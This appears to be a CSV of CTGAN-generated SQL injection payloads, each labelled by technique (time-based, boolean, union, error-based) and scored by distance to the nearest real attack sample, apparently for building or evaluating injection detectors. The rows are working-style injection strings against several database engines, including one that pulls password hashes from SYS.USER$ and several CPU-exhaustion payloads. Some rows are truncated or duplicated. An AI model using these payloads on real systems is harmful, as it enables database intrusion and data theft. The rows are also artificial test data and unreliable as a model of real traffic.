CTGAN_001483,attack,time,1  )   as bidc where 5268  =  5268 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,nearest_attack_euclidean,R006449,4.010285696121391
CTGAN_001484,attack,other,1 where 4985  =  4985 order by 1#,nearest_attack_euclidean,R008959,3.887829611897027
CTGAN_001485,attack,other,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  ||'",nearest_attack_euclidean,R000813,12.56745582345128
CTGAN_001486,attack,other,1  )   as sglv where 7676  =  7676,nearest_attack_euclidean,R004431,1.4310940320247936
CTGAN_001487,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R002352,4.057631988014325
CTGAN_001488,attack,other,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R007040,4.099724008358038
CTGAN_001489,attack,boolean,"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""uqyb""  =  ""uqyb",nearest_attack_euclidean,R008542,5.663985141263917
CTGAN_001490,attack,time,1' where 8482  =  8482 or sleep  (  5  )  #,nearest_attack_euclidean,R003922,2.4307557328337843
CTGAN_001491,attack,other,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ||'",nearest_attack_euclidean,R002738,4.234045607335309
CTGAN_001492,attack,other,1' where 6116  =  6116,nearest_attack_euclidean,R001565,3.660591719505604
CTGAN_001493,attack,boolean,"1""   )    )    as dfwi where 9703  =  9703 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R004599,3.065314710985945
CTGAN_001494,attack,error,"1  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  8529  =  8529",nearest_attack_euclidean,R007446,4.913876579450047
CTGAN_001495,attack,other,"1,  (  case when 5514  =  9602 then 1 else null end  )  ",nearest_attack_euclidean,R008056,2.668712217738039
CTGAN_001496,attack,error,"1%'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R006516,3.0963216331039574
CTGAN_001497,attack,union,"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#",nearest_attack_euclidean,R001655,3.2651489563082223
CTGAN_001498,attack,time,"1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000716,4.388572284545501
CTGAN_001499,attack,other,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  ",nearest_attack_euclidean,R003600,2.790164781833142
CTGAN_001500,attack,other,1   )    )    as mlpf where 7425  =  7425,nearest_attack_euclidean,R001024,1.4924542858809944
CTGAN_001501,attack,union,"-2027%""  )   union all select 2048,2048,2048,2048,2048,2048,2048,2048#",nearest_attack_euclidean,R001054,4.381268516092588
CTGAN_001502,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   # ogwe",nearest_attack_euclidean,R004355,6.846975629407845
CTGAN_001503,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R006469,5.328375819816165
CTGAN_001504,attack,boolean,"1'||  (  select 'wgte' from dual where 6316  =  6316 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",nearest_attack_euclidean,R004153,6.4765674780591
CTGAN_001505,attack,union,"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000991,5.152445493228065
CTGAN_001506,attack,union,"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",nearest_attack_euclidean,R007645,5.172624915194725
CTGAN_001507,attack,other,select   (  case when   (  3773  =  3722  )   then 3773 else 3773*  (  select 3773 from mysql.db  )   end  )  #,nearest_attack_euclidean,R008482,4.0753162245326395
CTGAN_001508,attack,union,"-3498""   )    )    as xbvb where 2056  =  2056 union all select 2056,2056,2056,2056,2056,2056,2056--",nearest_attack_euclidean,R004409,3.123057479668777
CTGAN_001509,attack,error,"1%""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R003328,6.954095860542296
CTGAN_001510,attack,boolean,1'  )   and 2305  =  1934,nearest_attack_euclidean,R006483,2.594137783205109
CTGAN_001511,attack,error,"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'gwew' like 'gwew",nearest_attack_euclidean,R002314,5.922601999416592
CTGAN_001512,attack,other,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- mkoo",nearest_attack_euclidean,R005337,5.131598137399268
CTGAN_001513,attack,union,"-3853""  )   where 4626  =  4626 union all select 4626,4626,4626--",nearest_attack_euclidean,R001057,3.4530248742173804
CTGAN_001514,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  -- mwsm",nearest_attack_euclidean,R005173,3.260096888213008
CTGAN_001515,attack,time,"1',  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R008435,6.283080987335858
CTGAN_001516,attack,boolean,"1%"" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006933,3.8186949360162075
CTGAN_001517,attack,boolean,1 and 9198  =  9198--,nearest_attack_euclidean,R005658,1.6182368338500142
CTGAN_001518,attack,boolean,"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'wdru' like 'wdru",nearest_attack_euclidean,R002265,3.4507291452658784
CTGAN_001519,attack,error,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'vedm'  =  'vedm",nearest_attack_euclidean,R005576,3.0209204057930017
CTGAN_001520,attack,other,1  )   as wiyx where 6515  =  6515,nearest_attack_euclidean,R004074,2.9530948407540407
CTGAN_001521,attack,error,"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'hbld'  =  'hbld",nearest_attack_euclidean,R008936,2.586825513993345
CTGAN_001522,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'ccqs'  =  'ccqs",nearest_attack_euclidean,R004455,5.0805129254293435
CTGAN_001523,attack,other,"  (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R002789,3.832023141661697
CTGAN_001524,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,3.5799578257778135
CTGAN_001525,attack,boolean,1%'  )   and 9198  =  9198--,nearest_attack_euclidean,R005199,3.250568381694077
CTGAN_001526,attack,boolean,"1'||  (  select 'lije' from dual where 5309  =  5309 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",nearest_attack_euclidean,R002065,4.266945183864841
CTGAN_001527,attack,time,"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""afby""  =  ""afby",nearest_attack_euclidean,R003688,3.718917581157482
CTGAN_001528,attack,boolean,"1   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R003333,2.9180956213219047
CTGAN_001529,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   #",nearest_attack_euclidean,R007715,5.113665453224682
CTGAN_001530,attack,boolean,"1'   )    )    and make_set  (  3793  =  8118,8118  )   and    (    (   'swvc' like 'swvc",nearest_attack_euclidean,R008681,3.4447436074312816
CTGAN_001531,attack,boolean,"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",nearest_attack_euclidean,R000019,9.563160853596711
CTGAN_001532,attack,union,"-8069   )    )    as sxbn where 7689  =  7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",nearest_attack_euclidean,R006079,4.474514195896963
CTGAN_001533,attack,error,"-1272' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R005424,5.9232076525755
CTGAN_001534,attack,union,"-1755%' union all select 2615,2615,2615,2615,2615,2615#",nearest_attack_euclidean,R003098,3.056310970324755
CTGAN_001535,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,14.215741986430016
CTGAN_001536,attack,other,1' where 7036  =  7036,nearest_attack_euclidean,R001285,3.5033403637405063
CTGAN_001537,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R006469,5.172144821988608
CTGAN_001538,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R007465,2.9673833810016403
CTGAN_001539,attack,other,   (  select top 1,nearest_attack_euclidean,R000225,3.9895276078719464
CTGAN_001540,attack,error,"1   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   3626  =  3626",nearest_attack_euclidean,R003385,2.972404224911364
CTGAN_001541,attack,boolean,"1'||  (  select 'skds' from dual where 8594  =  8594 and make_set  (  6779  =  2027,2027   )    )   ||'",nearest_attack_euclidean,R004794,2.9720841750936344
CTGAN_001542,attack,other,select name from syscolumns where id   =     (  sele ...,nearest_attack_euclidean,R000440,3.3566819212428127
CTGAN_001543,attack,boolean,"1%"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,nearest_attack_euclidean,R007875,2.9054992791229357
CTGAN_001544,attack,other,1 where 9872  =  9872,nearest_attack_euclidean,R000894,2.399206978652558
CTGAN_001545,attack,error,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""lgwe"" like ""lgwe",nearest_attack_euclidean,R005121,4.186056421219171
CTGAN_001546,attack,boolean,"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R004767,3.9040662762928564
CTGAN_001547,attack,union,"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",nearest_attack_euclidean,R002117,3.726442120649475
CTGAN_001548,attack,union,"-2667  )   union all select 5848,5848,5848,5848--",nearest_attack_euclidean,R004346,4.157146316406421
CTGAN_001549,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001643,7.810056011783364
CTGAN_001550,attack,boolean,"1  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R004574,1.7668975962044098
CTGAN_001551,attack,union,"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",nearest_attack_euclidean,R007394,2.685540102713237
CTGAN_001552,attack,error,"1""  )   as fkco where 8877  =  8877 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R003075,5.179936438006028
CTGAN_001553,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R004049,2.986740147829538
CTGAN_001554,attack,other,"  (  select 1 from generate_series  (  8515,8515,case when   (  8515  =  3477  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R004787,2.541728140210065
CTGAN_001555,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",nearest_attack_euclidean,R004331,2.977263072463867
CTGAN_001556,attack,union,"-8950""   )    )    as uahs where 2113  =  2113 union all select 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",nearest_attack_euclidean,R000886,16.727576355723826
CTGAN_001557,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R007727,4.666819780268361
CTGAN_001558,attack,boolean,"1'||  (  select 'xuof' from dual where 8794  =  8794 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003511,4.982820442077576
CTGAN_001559,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R001852,3.0980629505405526
CTGAN_001560,attack,boolean,"1'||  (  select 'ctgs' where 6809  =  6809 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R008836,7.046919194546975
CTGAN_001561,attack,other,"select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   from dual--",nearest_attack_euclidean,R001818,7.910332381696601
CTGAN_001562,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R003399,8.446510419781395
CTGAN_001563,attack,error,1'||  (  select 'brde' where 7390  =  7390 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',nearest_attack_euclidean,R004777,4.287392383764551
CTGAN_001564,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R004448,3.138495783889612
CTGAN_001565,attack,boolean,"1""   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""hmun""  =  ""hmun",nearest_attack_euclidean,R005486,4.97385208853433
CTGAN_001566,attack,time,"select sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001838,3.108584240472424
CTGAN_001567,attack,union," select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000385,20.057568785721593
CTGAN_001568,attack,union,"-9507%"" union all select 3342,3342,3342,3342,3342#",nearest_attack_euclidean,R007582,3.6970929883638535
CTGAN_001569,attack,boolean,-1587'  )   or 8339  =  5540,nearest_attack_euclidean,R004533,1.455638950717142
CTGAN_001570,attack,error,1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'nfix'  =  'nfix,nearest_attack_euclidean,R008401,4.551339761622139
CTGAN_001571,attack,boolean,1'||  (  select 'pxkz' where 2207  =  2207 and   (  3020  =  3020  )  *6703  )  ||',nearest_attack_euclidean,R007000,3.594680585010159
CTGAN_001572,attack,other,1'||  (  select 'yezk' where 2097  =  2097,nearest_attack_euclidean,R006958,3.0901419361565132
CTGAN_001573,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R001174,4.341569664992476
CTGAN_001574,attack,boolean,"1' in boolean mode  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  #",nearest_attack_euclidean,R008008,5.887520918914581
CTGAN_001575,attack,other,if  (  5896  =  4251  )   select 5896 else drop function xmyk--,nearest_attack_euclidean,R001289,3.0977738415580225
CTGAN_001576,attack,other,-6984 order by 1#,nearest_attack_euclidean,R005078,5.078412073171966
CTGAN_001577,attack,boolean,"1""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R006704,2.706344868630427
CTGAN_001578,attack,boolean,"1'||  (  select 'jpso' from dual where 9357  =  9357 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",nearest_attack_euclidean,R000979,8.203340082573911
CTGAN_001579,attack,time,1'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  'mzqi'  =  'mzqi,nearest_attack_euclidean,R003815,4.272916057634182
CTGAN_001580,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  PASSWORD   )    )    FROM SYS.USER$   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000613,5.6366039459198705
CTGAN_001581,attack,union,"1""   )    )    as tjdz where 8656  =  8656 union all select null,null,null,null,null--",nearest_attack_euclidean,R003571,4.93314572860832
CTGAN_001582,attack,boolean,"-9676 or elt  (  1032  =  1032,3623  )  # jcaq",nearest_attack_euclidean,R004989,2.948550135044158
CTGAN_001583,attack,other,select   (  case when   (  9376  =  4521  )   then 1 else 9376*  (  select 9376 from master..sysdatabases  )   end  )  --,nearest_attack_euclidean,R006737,3.5336386213326008
CTGAN_001584,attack,time,"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R001841,2.681607008262021
CTGAN_001585,attack,other,"1""  )   as ranl where 5553  =  5553",nearest_attack_euclidean,R007510,0.9153035702051892
CTGAN_001586,attack,boolean,"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'zoxm' like 'zoxm",nearest_attack_euclidean,R001452,2.4775786084627676
CTGAN_001587,attack,boolean,-1587'  )   or 8339  =  5540,nearest_attack_euclidean,R004533,2.149606914842658
CTGAN_001588,attack,error,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,nearest_attack_euclidean,R006827,3.9268286420381
CTGAN_001589,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R005606,3.9122085536141915
CTGAN_001590,attack,time,"1'||  (  select 'ymac' from dual where 9268  =  9268 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  ||'",nearest_attack_euclidean,R003231,5.5367270114366995
CTGAN_001591,attack,other,"1"" where 4281  =  4281",nearest_attack_euclidean,R000669,3.911479121904025
CTGAN_001592,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R005725,3.656586732745497
CTGAN_001593,attack,union,"-5998""  )   as gazd where 2814  =  2814 union all select 2814,2814,2814,2814,2814,2814,2814--",nearest_attack_euclidean,R007830,4.719806922373256
CTGAN_001594,attack,boolean,"1   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  3950  =  3950",nearest_attack_euclidean,R007834,4.156235018104065
CTGAN_001595,attack,boolean,"1  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R003755,1.3648917223368302
CTGAN_001596,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,1.9571733016111859
CTGAN_001597,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  6518  =  6518,nearest_attack_euclidean,R007927,4.206169107375168
CTGAN_001598,attack,boolean,1'  )   and   (  7603  =  3634  )  *3634,nearest_attack_euclidean,R000766,2.9219682309479285
CTGAN_001599,attack,other,or,nearest_attack_euclidean,R000581,3.3421118851496256
CTGAN_001600,attack,time,1' in boolean mode  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R003584,4.882006044634496
CTGAN_001601,attack,boolean,"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",nearest_attack_euclidean,R002026,3.4150019983299726
CTGAN_001602,attack,union,"1'  )   union all select null,null,null,null,null--",nearest_attack_euclidean,R005850,4.0219758490179585
CTGAN_001603,attack,other,1 rlike   (  select   (  case when   (  8314  =  5463  )   then 1 else 0x28 end   )    ) ,nearest_attack_euclidean,R005616,3.45633343145754
CTGAN_001604,attack,error,"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R005201,2.6328111468248223
CTGAN_001605,attack,other,"1,  (  select 9100  =    (  'qqpjq'||  (  select case 9100 when 9100 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ",nearest_attack_euclidean,R007006,3.7100777250456383
CTGAN_001606,attack,time,select pg_sleep  (  5  )   and    (    (     (  9476  =  9476,nearest_attack_euclidean,R005888,4.122811504570297
CTGAN_001607,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R006453,3.0581144335671224
CTGAN_001608,attack,other,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  ||'",nearest_attack_euclidean,R000813,10.691153538772145
CTGAN_001609,attack,boolean,"1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'javh'  =  'javh",nearest_attack_euclidean,R008985,5.353409541039666
CTGAN_001610,attack,union,"1""   )    )    as tjdz where 8656  =  8656 union all select null,null,null,null,null--",nearest_attack_euclidean,R003571,5.131615679989478
CTGAN_001611,attack,boolean,1' and 2908  =  8067--,nearest_attack_euclidean,R007433,3.202541980667666
CTGAN_001612,attack,boolean,"-6263%""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R006683,3.132556897262522
CTGAN_001613,attack,boolean,"1' in boolean mode  )   and elt  (  4249  =  4249,7259  )  #",nearest_attack_euclidean,R002099,3.9539709996516836
CTGAN_001614,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R007430,4.208337792240012
CTGAN_001615,attack,boolean,"1""   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R002947,4.205789440445044
CTGAN_001616,attack,error,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""lgwe"" like ""lgwe",nearest_attack_euclidean,R005121,4.898381028636539
CTGAN_001617,attack,time,1'  )   or sleep  (  5  ) ,nearest_attack_euclidean,R002985,3.2668436138388155
CTGAN_001618,attack,time,1%'   )    )    and sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R005074,4.515878027679524
CTGAN_001619,attack,time,"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R001841,3.782231346267265
CTGAN_001620,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R007483,5.151552167913257
CTGAN_001621,attack,other,1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   # mekk,nearest_attack_euclidean,R005094,3.545823358625835
CTGAN_001622,attack,union,"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",nearest_attack_euclidean,R001505,3.2357455453389647
CTGAN_001623,attack,boolean,-2761 or 1144  =  7657-- mfml,nearest_attack_euclidean,R001678,2.3356034053183676
CTGAN_001624,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R002385,4.532184754469033
CTGAN_001625,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R001099,2.9240281080562105
CTGAN_001626,attack,union,"1"" where 4183  =  4183 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R004090,6.344216540565323
CTGAN_001627,attack,boolean,"1'||  (  select 'nbmo' from dual where 5572  =  5572 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R005618,4.818280248869329
CTGAN_001628,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R004049,4.459757704933524
CTGAN_001629,attack,other,1  )   where 7026  =  7026,nearest_attack_euclidean,R001112,1.8959587957112662
CTGAN_001630,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R003691,2.535097059536402
CTGAN_001631,attack,other,"1""   )    )    as ikuz where 7385  =  7385",nearest_attack_euclidean,R007448,3.3580560900794763
